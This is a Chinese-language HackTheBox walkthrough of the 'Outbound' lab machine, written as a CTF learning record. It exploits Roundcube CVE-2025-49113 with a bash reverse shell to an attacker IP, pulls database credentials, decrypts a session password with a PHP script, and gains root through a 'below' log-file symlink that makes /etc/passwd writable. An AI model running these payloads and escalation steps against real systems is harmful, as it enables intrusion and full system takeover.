{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Outbound","contentHtml":"<h1>Season8 - Outbound</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/672\">https://app.hackthebox.com/machines/672</a> | <code>Linux</code> | <code>Easy</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image.png\" alt=\"image.png\"></p>\n<p>**Machine Information：**As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2</p>\n<h2>Recon</h2>\n<pre><code class=\"hljs language-bash\">➜  Outbound nmap -sT -min-rate 5000 -p- 10.10.11.77 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 11:50 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.77\nHost is up (0.099s latency).\nNot shown: 65411 filtered tcp ports (no-response), 122 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 39.56 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Outbound nmap -sT -A -p 22,80 10.10.11.77                                                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 11:52 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.77\nHost is up (0.18s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:<span class=\"hljs-built_in\">df</span> (ECDSA)\n|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:<span class=\"hljs-built_in\">df</span>:38:b0 (ED25519)\n80/tcp open  http    nginx 1.24.0 (Ubuntu)\n|_http-server-header: nginx/1.24.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://mail.outbound.htb/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   240.46 ms 10.10.16.1\n2   96.68 ms  10.10.11.77\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 43.68 seconds\n</code></pre>\n<p>访问 <code>HTTP</code> 默认域名是 <code>mail.outbound.htb</code> ，搭建着 <code>Roundcube Webmail 1.6.10</code></p>\n<p>可以以提供的账户进行登录</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image1.png\" alt=\"image.png\"></p>\n<h2><strong>CVE-2025-49113</strong></h2>\n<p>在关于中能知道版本是<code>1.6.10</code> ，能找到一个漏洞 <strong><code>CVE-2025-49113</code></strong></p>\n<blockquote>\n<p><a href=\"https://support.plesk.com/hc/en-us/articles/32537488344343-CVE-2025-49113-Vulnerability-in-Roundcube-on-Plesk-servers\">https://support.plesk.com/hc/en-us/articles/32537488344343-CVE-2025-49113-Vulnerability-in-Roundcube-on-Plesk-servers</a></p>\n</blockquote>\n<p>EXP链接：<a href=\"https://github.com/fearsoff-org/CVE-2025-49113\">https://github.com/fearsoff-org/CVE-2025-49113</a></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image2.png\" alt=\"image.png\"></p>\n<p>我们直接反弹<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 <span class=\"hljs-string\">'/bin/bash -c \"bash -i >&#x26; /dev/tcp/10.10.xxxxx/1234 0>&#x26;1\"'</span> \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image3.png\" alt=\"image.png\"></p>\n<h2>In www-data</h2>\n<h3>信息收集</h3>\n<p>看一下家目录</p>\n<pre><code class=\"hljs language-bash\">www-data@mail:/var/www/html/roundcube/public_html$ <span class=\"hljs-built_in\">ls</span> /home\njacob  mel  tyler\n</code></pre>\n<p>查看监听的端口</p>\n<pre><code class=\"hljs language-bash\">www-data@mail:/var/www/html/roundcube/public_html/roundcube$ ss -tulpn\nNetid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                                               \ntcp   LISTEN 0      100        127.0.0.1:25        0.0.0.0:*                                                         \ntcp   LISTEN 0      100          0.0.0.0:143       0.0.0.0:*                                                         \ntcp   LISTEN 0      100          0.0.0.0:110       0.0.0.0:*                                                         \ntcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    <span class=\"hljs-built_in\">users</span>:((\"nginx\",pid=<span class=\"hljs-number\">204</span>,fd=<span class=\"hljs-number\">5</span>),(\"nginx\",pid=<span class=\"hljs-number\">202</span>,fd=<span class=\"hljs-number\">5</span>))\ntcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*                                                         \ntcp   LISTEN 0      100          0.0.0.0:993       0.0.0.0:*                                                         \ntcp   LISTEN 0      100          0.0.0.0:995       0.0.0.0:*                                                         \ntcp   LISTEN 0      100            [::1]:25           [::]:*                                                         \ntcp   LISTEN 0      100             [::]:143          [::]:*                                                         \ntcp   LISTEN 0      100             [::]:110          [::]:*                                                         \ntcp   LISTEN 0      100             [::]:993          [::]:*                                                         \ntcp   LISTEN 0      100             [::]:995          [::]:*\n</code></pre>\n<p>有在运行<code>mysql</code>，我们找一下配置文件</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image4.png\" alt=\"image.png\"></p>\n<p>找到账号密码</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$config</span>[<span class=\"hljs-string\">'db_dsnw'</span>] = <span class=\"hljs-string\">'mysql://roundcube:RCDBPass2025@localhost/roundcube'</span>;\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image5.png\" alt=\"image.png\"></p>\n<p>用户表，但是貌似没什么用</p>\n<pre><code class=\"hljs language-bash\">MariaDB [roundcube]> <span class=\"hljs-keyword\">select</span> * from <span class=\"hljs-built_in\">users</span>;\n+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+----------------------------------------------------+\n| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                        |\n+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+----------------------------------------------------+\n|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-07-13 05:06:54 | 2025-07-13 05:26:40 |                    3 | en_US    | a:1:{s:11:<span class=\"hljs-string\">\"client_hash\"</span>;s:16:<span class=\"hljs-string\">\"newrandomhash1234\"</span>;} |\n|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:<span class=\"hljs-string\">\"client_hash\"</span>;s:16:<span class=\"hljs-string\">\"GCrPGMkZvbsnc3xv\"</span>;}  |\n|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-07-13 05:32:03 | 2025-06-11 07:51:22 |                    1 | en_US    | a:1:{s:11:<span class=\"hljs-string\">\"client_hash\"</span>;s:16:<span class=\"hljs-string\">\"Y2Rz3HTwxwLJHevI\"</span>;}  |\n|       4 | hacker   | localhost | 1000-01-01 00:00:00 | NULL                | 2025-07-13 05:31:53 |                    1 | NULL     | a:1:{s:11:<span class=\"hljs-string\">\"client_hash\"</span>;s:16:<span class=\"hljs-string\">\"hackedhash123456\"</span>;}  |\n+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+----------------------------------------------------+\n4 rows <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.000 se\n</code></pre>\n<h3>解密 session</h3>\n<p>从网上一篇文章中：<a href=\"https://www.roundcubeforum.net/index.php?topic=23399.0\">https://www.roundcubeforum.net/index.php?topic=23399.0</a></p>\n<p>可以知道，可以从<code>session-vars</code>中解密出密码</p>\n<p>我们再看 <code>session</code>表</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image6.png\" alt=\"image.png\"></p>\n<p><code>base64</code>解码：</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image7.png\" alt=\"image.png\"></p>\n<p>这里找了几个都是<code>tyler</code> 用户，对我们没用，因为我们有了<code>tyler</code>用户的凭据</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image8.png\" alt=\"image.png\"></p>\n<p>其中有个<code>jacob</code> 用户的，我们应该是要破解该密码</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image9.png\" alt=\"image.png\"></p>\n<p>从 <code>config.inc.php</code> 中拿到<code>des_key</code></p>\n<pre><code class=\"hljs language-bash\">// This key is used to encrypt the <span class=\"hljs-built_in\">users</span> imap password <span class=\"hljs-built_in\">which</span> is stored\n// <span class=\"hljs-keyword\">in</span> the session record. For the default cipher method it must be\n// exactly 24 characters long.\n// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS\n<span class=\"hljs-variable\">$config</span>[<span class=\"hljs-string\">'des_key'</span>] = <span class=\"hljs-string\">'rcmail-!24ByteDESkey*Str'</span>;\n</code></pre>\n<p>直接丢给<code>Gemini</code>生成脚本</p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php\n\n// 你的输入\n<span class=\"hljs-variable\">$encrypted_base64</span> = <span class=\"hljs-string\">'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'</span>;\n<span class=\"hljs-variable\">$key</span> = <span class=\"hljs-string\">'rcmail-!24ByteDESkey*Str'</span>;\n\n// 1. Base64 解码\n<span class=\"hljs-variable\">$data</span> = base64_decode(<span class=\"hljs-variable\">$encrypted_base64</span>);\n\n// 2. 分离 IV 和密文\n// 获取 3DES-CBC 模式的 IV 长度 (结果是 8)\n<span class=\"hljs-variable\">$iv_size</span> = openssl_cipher_iv_length(<span class=\"hljs-string\">'des-ede3-cbc'</span>);\n<span class=\"hljs-variable\">$iv</span> = substr(<span class=\"hljs-variable\">$data</span>, 0, <span class=\"hljs-variable\">$iv_size</span>);\n<span class=\"hljs-variable\">$ciphertext</span> = substr(<span class=\"hljs-variable\">$data</span>, <span class=\"hljs-variable\">$iv_size</span>);\n\n// 3. 使用 OpenSSL 进行解密\n// Roundcube 使用零填充，所以要加上 OPENSSL_ZERO_PADDING 标志\n<span class=\"hljs-variable\">$decrypted</span> = openssl_decrypt(\n    <span class=\"hljs-variable\">$ciphertext</span>,\n    <span class=\"hljs-string\">'des-ede3-cbc'</span>, // 算法：3DES <span class=\"hljs-keyword\">in</span> CBC mode\n    <span class=\"hljs-variable\">$key</span>,\n    OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, // 选项：原始数据 + 零填充\n    <span class=\"hljs-variable\">$iv</span>\n);\n\n// 4. 移除末尾的空字节填充\n<span class=\"hljs-variable\">$password</span> = rtrim(<span class=\"hljs-variable\">$decrypted</span>, <span class=\"hljs-string\">\"\\0\"</span>);\n\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"解密后的密码是: \"</span> . <span class=\"hljs-variable\">$password</span> . <span class=\"hljs-string\">\"\\n\"</span>;\n\n?>\n</code></pre>\n<p>得到密码，但是无法使用<code>SSH</code>进行登录</p>\n<pre><code class=\"hljs language-bash\">➜  Outbound php decrypt.php\n解密后的密码是: 595mO8DmwGeD\n</code></pre>\n<p>但是可以通过 <code>su</code> 切换过去</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image10.png\" alt=\"image.png\"></p>\n<h2>In Jacob</h2>\n<h3>权限提升</h3>\n<p>家目录有<code>mail</code>文件夹</p>\n<pre><code class=\"hljs language-bash\">jacob@mail:~/mail/INBOX$ <span class=\"hljs-built_in\">cat</span> jacob \nFrom tyler@outbound.htb  Sat Jun 07 14:00:58 2025\nReturn-Path: &#x3C;tyler@outbound.htb>\nX-Original-To: jacob                     \nDelivered-To: jacob@outbound.htb\nReceived: by outbound.htb (Postfix, from userid 1000)\n        <span class=\"hljs-built_in\">id</span> B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)\nTo: jacob@outbound.htb\nSubject: Important Update\nMIME-Version: 1.0\nContent-Type: text/plain; charset=<span class=\"hljs-string\">\"UTF-8\"</span>                                                       \nContent-Transfer-Encoding: 8bit\nMessage-Id: &#x3C;20250607140058.B32C410248D@outbound.htb>\nDate: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)                                                     \nFrom: tyler@outbound.htb \nX-IMAPbase: 1749304753 0000000002                                                               \nX-UID: 1\nStatus: \nX-Keywords:                                                                        \nContent-Length: 233\n\nDue to the recent change of policies your password has been changed.\nPlease use the following credentials to <span class=\"hljs-built_in\">log</span> into your account: gY4Wr3a1evp4\n                                                                                                \nRemember to change your password when you next <span class=\"hljs-built_in\">log</span> into your account.    \n                                                \nThanks!                                         \n                                                \nTyler                      \n                                                \nFrom mel@outbound.htb  Sun Jun 08 12:09:45 2025\nReturn-Path: &#x3C;mel@outbound.htb> \nX-Original-To: jacob       \nDelivered-To: jacob@outbound.htb\nReceived: by outbound.htb (Postfix, from userid 1002)                                           \n        <span class=\"hljs-built_in\">id</span> 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)                                      \nTo: jacob@outbound.htb             \nSubject: Unexpected Resource Consumption                                                        \nMIME-Version: 1.0                \nContent-Type: text/plain; charset=<span class=\"hljs-string\">\"UTF-8\"</span>\nContent-Transfer-Encoding: 8bit \nMessage-Id: &#x3C;20250608120945.1487E22C@outbound.htb>   \nDate: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)                                                     \nFrom: mel@outbound.htb\nX-UID: 2                 \nStatus:          \nX-Keywords:                                                                                     \nContent-Length: 261            \n                                                                                                \nWe have been experiencing high resource consumption on our main server.                         \nFor now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.\nPlease inform us immediately <span class=\"hljs-keyword\">if</span> you notice any irregularities.                                  \n                                                \nThanks! \n                                                                                                \nMel                \n</code></pre>\n<p>从上面的邮件得知，新密码：<code>gY4Wr3a1evp4</code> ，然后服务器开启了资源监控功能，并授予您检查日志的权限。</p>\n<p>我们通过新密码能使用<code>ssh</code>登录上去</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image11.png\" alt=\"image.png\"></p>\n<p>通过 <code>ssh</code> 进来的可以读取<code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">jacob@outbound:~$ <span class=\"hljs-built_in\">cat</span> user.txt\nc82c459d58754712xxxxx\n</code></pre>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">jacob@outbound:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> jacob on outbound:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser jacob may run the following commands on outbound:\n    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*\n</code></pre>\n<p>本以为可以直接通过读文件来拿到 <code>root.txt</code> ，但是<code>sudoers</code>中禁用了 <code>--config,--debug,-d</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image12.png\" alt=\"image.png\"></p>\n<p>应该还是和日志有关</p>\n<pre><code class=\"hljs language-bash\">jacob@outbound:/var/log/below$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 16\ndrwxrwxrwx  3 root  root   4096 Jul 13 07:18 .\ndrwxrwxr-x 13 root  syslog 4096 Jul 13 06:58 ..\n-rw-rw-rw-  1 jacob jacob   382 Jul 13 07:02 error_jacob.log\n-rw-rw-rw-  1 root  root      0 Jul 13 07:18 error_root.log\ndrwxr-xr-x  2 root  root   4096 Jul 13 06:57 store\n</code></pre>\n<p>我们对当前文件夹拥有完全的权限</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'sunset::0:0:sunset:/root:/bin/bash'</span> > /tmp/fakepasswd\n<span class=\"hljs-built_in\">rm</span> -f /var/log/below/error_root.log\n<span class=\"hljs-built_in\">ln</span> -s /etc/passwd /var/log/below/error_root.log\n<span class=\"hljs-built_in\">sudo</span> /usr/bin/below\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Outbound/image13.png\" alt=\"image.png\"></p>\n<p>最后再执行</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cp</span> /tmp/fakepasswd /var/log/below/error_root.log\n</code></pre>\n<blockquote>\n<p>这里发生了什么？</p>\n<ol>\n<li><code>below</code> 程序以 <code>root</code> 身份启动。</li>\n<li>作为一个日志/监控工具，它很可能会在启动时检查或初始化它的日志文件。它的默认日志文件之一就是 <code>/var/log/below/error_root.log</code>。</li>\n<li><code>below</code> 程序（以 <code>root</code> 权限）访问 <code>/var/log/below/error_root.log</code>。操作系统告诉它，这是一个指向 <code>/etc/passwd</code> 的符号链接。</li>\n<li>程序发现这个文件存在，但为了确保自己能持续写入日志，它可能会执行一个“修复权限”的操作。一个常见的不安全做法就是执行 <code>chmod 666</code> (或 <code>ugo+w</code>) 来确保文件是<strong>全局可写的</strong>。</li>\n<li><strong>关键漏洞</strong>: <code>chmod</code> 这个系统调用会<strong>跟随符号链接</strong>。当 <code>root</code> 权限的 <code>below</code> 进程对 <code>error_root.log</code> (符号链接) 执行 <code>chmod</code> 时，它实际上修改的是链接所指向的目标文件——<code>/etc/passwd</code>。</li>\n<li><strong>结果</strong>: <code>/etc/passwd</code> 文件的权限从 <code>rw-r--r--</code> (644) 被修改为了 <strong><code>rw-rw-rw-</code> (666)</strong>。</li>\n</ol>\n</blockquote>\n<p>切换用户读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">sunset@outbound:~# <span class=\"hljs-built_in\">cat</span>  root.txt\n26811e234c8fb48520e38bf44c164bec\n</code></pre>\n<h2>总结</h2>\n<p>到提权之前都是一把梭，提权其实也是，但是对<code>below</code>不熟悉。</p>\n<p>提权思路是抄的。</p>","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","updated":"2025-07-13","tags":["HackTheBox","Linux","RoundcubeMail","Below","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Outbound\n\n https://app.hackthebox.com/machines/672 | `Linux` | `Easy`\n \n\n\n\nMachine Information：As is common in real life pentests, you will start the Outbound box with credentials for the fo...","isEncrypted":true},"recentPosts":[{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"}]},"__N_SSG":true}